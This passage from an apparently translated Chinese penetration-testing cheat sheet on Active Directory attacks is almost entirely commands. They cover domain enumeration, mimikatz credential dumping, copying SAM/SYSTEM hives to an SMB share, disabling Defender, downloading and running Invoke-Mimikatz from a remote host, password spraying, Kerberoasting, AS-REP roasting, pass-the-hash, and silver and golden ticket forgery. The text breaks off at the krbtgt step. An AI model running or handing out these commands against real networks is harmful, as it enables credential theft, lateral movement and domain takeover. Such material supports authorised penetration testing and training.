<p>八进制<br><code>http://www.unit-conversion.info/texttools/octal/</code></p>
<p>十六进制<br><code>http://www.unit-conversion.info/texttools/octal/</code></p>
<p>IP 转换器<br><code>https://www.silisoftware.com/tools/ipconverter.php</code></p>
<h1 id="二十一至二十三、活动目录"><a href="#二十一至二十三、活动目录" class="headerlink" title="二十一至二十三、活动目录"></a>二十一至二十三、活动目录</h1><h2 id="枚举-2"><a href="#枚举-2" class="headerlink" title="枚举"></a>枚举</h2><p>枚举整个域中的所有用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">net user /domain<br></code></pre></td></tr></table></figure>

<p>获取特定用户的信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">net user &lt;user&gt; /domain<br></code></pre></td></tr></table></figure>

<p>枚举整个域中的所有组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">net group /domain<br></code></pre></td></tr></table></figure>

<p>获取本地组成员</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Get-NetLocalGroup -ComputerName &lt;domain&gt; -Recurse (PowerView)<br></code></pre></td></tr></table></figure>

<p>找出域控制器主机名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br></code></pre></td></tr></table></figure>

<p>配置 ActiveDirectory 模块 - RSAT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">curl https:<span class="hljs-comment">//raw.githubusercontent.com/samratashok/ADModule/master/ActiveDirectory/ActiveDirectory.psd1 -o ActiveDirectory.psd1  </span><br>curl https:<span class="hljs-comment">//github.com/samratashok/ADModule/blob/master/Microsoft.ActiveDirectory.Management.dll?raw=true -o Microsoft.ActiveDirectory.Management.dll  </span><br>Import-Module .\Microsoft.ActiveDirectory.Management.dll  <br>Import-Module .\ActiveDirectory.psd1  <br></code></pre></td></tr></table></figure>

<p>配置PowerView模块</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">curl https:<span class="hljs-comment">//github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 -o PowerView.ps1</span><br>. .\PowerView.ps1<br></code></pre></td></tr></table></figure>

<p>上次登录</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Get-LastLoggedOn -ComputerName &lt;domain&gt;<br></code></pre></td></tr></table></figure>

<p>列出计算机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Get-NetComputer (PowerView)<br></code></pre></td></tr></table></figure>

<p>将域用户添加到域组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Add-DomainGroupMember -Identity <span class="hljs-string">&#x27;SQLManagers&#x27;</span> -Members <span class="hljs-string">&#x27;examed&#x27;</span><br>Get-NetGroupMember -GroupName <span class="hljs-string">&#x27;SQLManagers&#x27;</span><br></code></pre></td></tr></table></figure>

<p>所有 AD 用户的枚举脚本，以及这些用户帐户的所有属性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()<br><br>$PDC = ($domainObj.PdcRoleOwner).Name<br><br>$SearchString = <span class="hljs-string">&quot;LDAP://&quot;</span><br><br>$SearchString += $PDC + <span class="hljs-string">&quot;/&quot;</span><br><br>$DistinguishedName = <span class="hljs-string">&quot;DC=$($domainObj.Name.Replace(&#x27;.&#x27;, &#x27;,DC=&#x27;))&quot;</span><br><br>$SearchString += $DistinguishedName<br><br>$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)<br><br>$objDomain = New-Object System.DirectoryServices.DirectoryEntry<br><br>$Searcher.SearchRoot = $objDomain<br><br>$Searcher.filter=<span class="hljs-string">&quot;samAccountType=805306368&quot;</span><br><br>$Result = $Searcher.FindAll()<br><br>Foreach($obj in $Result)<br>&#123;<br>    Foreach($prop in $obj.Properties)<br>    &#123;<br>        $prop<br>    &#125;<br>    <br>    Write-Host <span class="hljs-string">&quot;------------------------&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>枚举登录用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Import-Module .\PowerView.ps1<br>Get-NetLoggedon -ComputerName &lt;computer_name&gt;<br></code></pre></td></tr></table></figure>

<p><code>https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1</code></p>
<p>枚举所有活动会话</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Get-NetSession -ComputerName dc1<br></code></pre></td></tr></table></figure>

<h4 id="通过服务主体名称进行枚举"><a href="#通过服务主体名称进行枚举" class="headerlink" title="通过服务主体名称进行枚举"></a>通过服务主体名称进行枚举</h4><p><code>https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1</code></p>
<h2 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h2><h3 id="远程桌面协议-RDP"><a href="#远程桌面协议-RDP" class="headerlink" title="远程桌面协议 - RDP"></a>远程桌面协议 - RDP</h3><p>创建用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">net user &lt;user&gt; &lt;password&gt; /add<br></code></pre></td></tr></table></figure>

<p>添加到本地管理员组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">net localgroup Administrators &lt;user&gt; /add<br></code></pre></td></tr></table></figure>

<p>添加到可以通过 RDP 访问的用户组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">net localgroup <span class="hljs-string">&quot;Remote Management Users&quot;</span> &lt;user&gt; /add<br>net localgroup <span class="hljs-string">&quot;Remote Desktop Users&quot;</span> &lt;user&gt; /add<br></code></pre></td></tr></table></figure>

<p>启用 RDP</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Set-ItemProperty -Path <span class="hljs-string">&#x27;HKLM:\System\CurrentControlSet\Control\Terminal Server&#x27;</span> -name <span class="hljs-string">&quot;fDenyTSConnections&quot;</span> -value <span class="hljs-number">0</span><br>Enable-NetFirewallRule -DisplayGroup <span class="hljs-string">&quot;Remote Desktop&quot;</span><br></code></pre></td></tr></table></figure>

<p>移动到另一个用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">runas /user:&lt;hostname&gt;\&lt;user&gt; cmd<br></code></pre></td></tr></table></figure>

<p>xfreerdp 通过 RDP 在 \tsclient\share\ 中共享</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">xfreerdp /u:user /p:pass /v:ip +clipboard /dynamic-resolution /cert:ignore /drive:/usr/share/windows-resources,share<br></code></pre></td></tr></table></figure>

<p>通过 RDP 的 rdesktop</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">rdesktop -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -f &lt;ip&gt;<br></code></pre></td></tr></table></figure>

<p>evil-winrm</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;<br></code></pre></td></tr></table></figure>

<h2 id="缓存凭证存储和检索"><a href="#缓存凭证存储和检索" class="headerlink" title="缓存凭证存储和检索"></a>缓存凭证存储和检索</h2><p>转储所有连接用户的凭据，包括缓存的哈希值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>

<p>组合执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;lsadump::lsa /inject&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-string">&quot;lsadump::cache&quot;</span> <span class="hljs-string">&quot;sekurlsa::ekeys&quot;</span> <span class="hljs-string">&quot;vault::cred /patch&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="提取哈希值"><a href="#提取哈希值" class="headerlink" title="提取哈希值"></a>提取哈希值</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>SAM - 安全帐户管理器（存储为用户帐户）%SystemRoot%&#x2F;system32&#x2F;config&#x2F;sam<br>NTDS.DIT​​（Windows Server &#x2F; Active Directory - 存储 AD 数据，包括用户帐户）%SystemRoot%&#x2F;ntds&#x2F;ntds.dit<br>SYSTEM（用于解密 SAM&#x2F;NTDS.DIT​​ 的系统文件）%SystemRoot%&#x2F;system32&#x2F;config&#x2F;system<br>备份 - Sistemas antigos como XP&#x2F;2003：C:\Windows\repair\sam 和 C:\Windows\repair\系统</p>
<h3 id="通过注册表获取sam和system（从旧版本到最新版本）"><a href="#通过注册表获取sam和system（从旧版本到最新版本）" class="headerlink" title="通过注册表获取sam和system（从旧版本到最新版本）"></a>通过注册表获取sam和system（从旧版本到最新版本）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">reg save hklm\sam sam<br>reg save hklm\system system<br></code></pre></td></tr></table></figure>

<p>通过 SMB 共享文件传输 sam 和 syste -&gt; 配置 smb 服务器 1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-smbserver share . -smb2support -user user -password teste321<br></code></pre></td></tr></table></figure>

<p>配置 smb 服务器 2</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">net use \\&lt;smbserver&gt;\share /USER:user teste321<br>copy C:\Users\Backup\sam.hive \\&lt;smbserver&gt;\share\<br>copy C:\Users\Backup\system.hive \\&lt;smbserver&gt;\share\<br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbserver.py</code></p>
<p>查看 smb 枚举</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">net view \\dc /all<br>net use * \\dc\c$<br>net use<br></code></pre></td></tr></table></figure>

<h3 id="卷影复制（Windows-Server-最新版本）"><a href="#卷影复制（Windows-Server-最新版本）" class="headerlink" title="卷影复制（Windows Server \ 最新版本）"></a>卷影复制（Windows Server \ 最新版本）</h3><p>vssadmin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">vssadmin create shadow /<span class="hljs-keyword">for</span>=c:<br></code></pre></td></tr></table></figure>

<p>hashdump</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashdump<br></code></pre></td></tr></table></figure>

<p>samdump2（Win 2k&#x2F;NT&#x2F;XP&#x2F;Vista SAM）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">samdump2 system sam<br></code></pre></td></tr></table></figure>

<p>转存SAM转储下载</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-secretsdump -sam sam -system system LOCAL<br></code></pre></td></tr></table></figure>

<h3 id="提取域中的哈希值并进行旋转"><a href="#提取域中的哈希值并进行旋转" class="headerlink" title="提取域中的哈希值并进行旋转"></a>提取域中的哈希值并进行旋转</h3><p>转储所有连接用户的凭据，包括缓存的哈希值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>

<p>mimikatz + ScriptBlock</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">$sess = New-PSSession -ComputerName &lt;hostname&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">Invoke-command -ScriptBlock&#123;Set-MpPreference -DisableIOAVProtection $<span class="hljs-literal">true</span>&#125; -Session $sess<br><span class="hljs-title function_">iex</span> <span class="hljs-params">(iwr http:<span class="hljs-comment">//&lt;ip&gt;/Invoke-Mimikatz.ps1 -UseBasicParsing)</span></span><br><span class="hljs-params">Invoke-command -ScriptBlock $&#123;function:Invoke-Mimikatz&#125; -Session $sess</span><br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Invoke-command -ScriptBlock&#123;Set-MpPreference -DisableIOAVProtection $<span class="hljs-literal">true</span>&#125; -Session $sess<br>Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess<br>Enter-PSSession $sess<br>Invoke-Mimikatz<br></code></pre></td></tr></table></figure>

<h3 id="提取缓存中的哈希值"><a href="#提取缓存中的哈希值" class="headerlink" title="提取缓存中的哈希值"></a>提取缓存中的哈希值</h3><p>fgdump</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">fgdump.exe<br></code></pre></td></tr></table></figure>

<p><code>/usr/share/windows-binaries/fgdump/fgdump.exe</code></p>
<p>解释器</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">load kiwi<br>creds_msv<br></code></pre></td></tr></table></figure>

<p>wce-universal（明文密码）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">wce-universal.exe -w<br></code></pre></td></tr></table></figure>

<p><code>/usr/share/windows-resources/wce/wce-universal.exe</code></p>
<p>mimikatz.exe</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">.\mimikatz.exe<br>sekurlsa::wdigest -a full  <br>sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>

<p>mimikatz - meterpreter</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">load mimikatz  <br>wdigest<br></code></pre></td></tr></table></figure>

<h3 id="提取哈希值（远程）"><a href="#提取哈希值（远程）" class="headerlink" title="提取哈希值（远程）"></a>提取哈希值（远程）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-secretsdump user:password@IP<br></code></pre></td></tr></table></figure>

<h2 id="服务帐户攻击"><a href="#服务帐户攻击" class="headerlink" title="服务帐户攻击"></a>服务帐户攻击</h2><p>播种存储在内存中的用户票证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./mimikatz.exe <span class="hljs-string">&quot;sekurlsa::tickets&quot;</span><br></code></pre></td></tr></table></figure>

<p>显示当前用户所有缓存的 Kerberos 票证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">klist<br></code></pre></td></tr></table></figure>

<p>从内存中导出服务票据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">./mimikatz.exe <span class="hljs-string">&quot;kerberos::list /export&quot;</span><br></code></pre></td></tr></table></figure>

<p>使用 tgsrepcrack.py 进行词表攻击以获取服务帐户的明文密码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo apt update &amp;&amp; sudo apt install kerberoast<br>python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt &lt;ticket.kirbi&gt;<br></code></pre></td></tr></table></figure>

<p>或者</p>
<p><code>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1</code></p>
<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin<br></code></pre></td></tr></table></figure>

<p><code>https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1</code></p>
<h2 id="枚举-BloodHound"><a href="#枚举-BloodHound" class="headerlink" title="枚举 - BloodHound"></a>枚举 - BloodHound</h2><p>安装 - 攻击者虚拟机</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo apt install bloodhound<br></code></pre></td></tr></table></figure>

<p>neo4j 启动 - <code>http://localhost:7474/</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo neo4j start<br></code></pre></td></tr></table></figure>

<p>枚举 - Windows</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">iwr -uri &lt;ip&gt;/SharpHound.ps1 -Outfile SharpHound.ps1<br>. .\SharpHound.ps1<br>Invoke-Bloodhound -CollectionMethod All,loggedon<br>Invoke-BloodHound -CollectionMethod All -Verbose<br>Invoke-BloodHound -CollectionMethod LoggedOn -Verbose<br></code></pre></td></tr></table></figure>

<h2 id="访问验证"><a href="#访问验证" class="headerlink" title="访问验证"></a>访问验证</h2><p>使用crackmmapexec通过smb验证网络用户凭证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span><span class="hljs-number">-20</span> -u administrator -H &lt;hash&gt; -d &lt;domain&gt; --<span class="hljs-keyword">continue</span>-on-success<br>crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span><span class="hljs-number">-20</span> -u administrator -H &lt;hash&gt; -d &lt;domain&gt; <br>crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span><span class="hljs-number">-20</span> -u administrator -H &lt;hash&gt; --local-auth --lsa  <br>crackmapexec smb <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.10</span><span class="hljs-number">-20</span> -u administrator -p &lt;password&gt;<br></code></pre></td></tr></table></figure>

<p>通过 smbclient 连接</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">smbclient <span class="hljs-comment">//ip -U &lt;user&gt; -L</span><br></code></pre></td></tr></table></figure>

<p>smbmap</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">smbmap -H &lt;ip&gt; -u &lt;user&gt; <br></code></pre></td></tr></table></figure>

<p>查看给定用户对 smb 共享的读取权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">crackmapexec smb &lt;IP&gt; --shares -u &lt;user&gt; -p <span class="hljs-string">&#x27;&lt;pass&gt;&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="AS-REP-Roasting攻击-不需要预身份验证"><a href="#AS-REP-Roasting攻击-不需要预身份验证" class="headerlink" title="AS-REP Roasting攻击 - 不需要预身份验证"></a>AS-REP Roasting攻击 - 不需要预身份验证</h2><p>kerbrute - 枚举用户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">kerbrute userenum -d test.local --dc &lt;dc_ip&gt; userlist.txt<br></code></pre></td></tr></table></figure>

<p><code>https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt</code></p>
<p>GetNPUsers.py - 从 KDC 查询 ASReproastable 帐户</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-GetNPUsers domain.local/ -dc-ip &lt;IP&gt; -usersfile userlist.txt<br></code></pre></td></tr></table></figure>

<h2 id="Kerberoast"><a href="#Kerberoast" class="headerlink" title="Kerberoast"></a>Kerberoast</h2><p>impacket-GetUserSPNs</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;<span class="hljs-comment">// -dc-ip &lt;IP&gt; -request</span><br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-GetUserSPNs -request -dc-ip &lt;IP&gt; -hashes &lt;hash_machine_account&gt;:&lt;hash_machine_account&gt; &lt;domain&gt;/&lt;machine_name$&gt; -outputfile hashes.kerberoast<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hashcat -a <span class="hljs-number">0</span> -m <span class="hljs-number">13100</span> ok.txt /usr/share/wordlists/rockyou.txt <br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\PsExec.exe -u &lt;domain&gt;\&lt;user&gt; -p &lt;password&gt; cmd.exe<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">runas /user:&lt;hostname&gt;\&lt;user&gt; cmd.exe<br></code></pre></td></tr></table></figure>

<h2 id="Active-Directory-横向移动"><a href="#Active-Directory-横向移动" class="headerlink" title="Active Directory 横向移动"></a>Active Directory 横向移动</h2><h3 id="传递哈希值"><a href="#传递哈希值" class="headerlink" title="传递哈希值"></a>传递哈希值</h3><p>允许攻击者通过用户的 NTLM 哈希对远程系统或服务进行身份验证</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:&lt;hash_ntlm&gt; <span class="hljs-comment">//&lt;IP&gt; cmd</span><br></code></pre></td></tr></table></figure>

<p>远程访问 - impacket-psexec</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">impacket-psexec <span class="hljs-string">&#x27;&lt;domain&gt;/&lt;user&gt;&#x27;</span>@&lt;IP&gt; -hashes <span class="hljs-string">&#x27;:&lt;hash&gt;&#x27;</span><br>impacket-psexec <span class="hljs-string">&#x27;&lt;domain&gt;/&lt;user&gt;&#x27;</span>@&lt;IP&gt;<br></code></pre></td></tr></table></figure>

<p>远程访问+evil-winrm</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -H &lt;hash&gt;<br></code></pre></td></tr></table></figure>

<h3 id="越过哈希值"><a href="#越过哈希值" class="headerlink" title="越过哈希值"></a>越过哈希值</h3><p>允许攻击者滥用 NTLM 用户哈希来获取完整的 Kerberos 票证授予票证 (TGT) 或服务票证，这使我们能够以该用户的身份访问另一台计算机或服务</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">mimikatz.exe <span class="hljs-string">&quot;sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>

<p>使用 psexec 执行命令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">.\PsExec.exe \\&lt;hostname&gt; cmd.exe<br></code></pre></td></tr></table></figure>

<h3 id="白银票据-通票"><a href="#白银票据-通票" class="headerlink" title="白银票据 - 通票"></a>白银票据 - 通票</h3><p>这是一种持久性和特权提升技术，通过伪造 TGS 来获取对应用程序中服务的访问权限。<br>获取SID</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">GetDomainsid (PowerView)<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">whoami /user<br></code></pre></td></tr></table></figure>

<p>获取机器帐户哈希</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">Invoke-Mimikatz <span class="hljs-string">&#x27;&quot;lsadump::lsa /patch&quot;&#x27;</span> -ComputerName &lt;hostname_dc&gt;<br></code></pre></td></tr></table></figure>

<p>利用mimikatz.exe</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">kerberos::purge<br>kerberos::<span class="hljs-built_in">list</span><br>kerberos::golden /user:&lt;user&gt; /domain:&lt;domain&gt; /sid:&lt;sid&gt; /target:&lt;hostname.domain&gt; /service:HTTP /rc4:&lt;ervice_account_password_hash&gt; /ptt<br></code></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">Invoke-Mimikatz -Command <span class="hljs-string">&#x27;&quot;kerberos::golden /domain:&lt;domain&gt; /sid:&lt;domainsid&gt; /target:&lt;dc&gt;.&lt;domain&gt; /service:HOST /rc4:&lt;machine_account_hash&gt; /user:Administrator /ptt&quot;&#x27;</span><br>kerberos::<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure>

<h3 id="黄金票据-通行证"><a href="#黄金票据-通行证" class="headerlink" title="黄金票据 - 通行证"></a>黄金票据 - 通行证</h3><p>这是一种持久性和特权提升技术，通过伪造票证来控制 Active Directory 密钥分发服务 (KRBTGT) 帐户并颁发 TGT。</p>
<p>获取哈希 krbtgt</p>
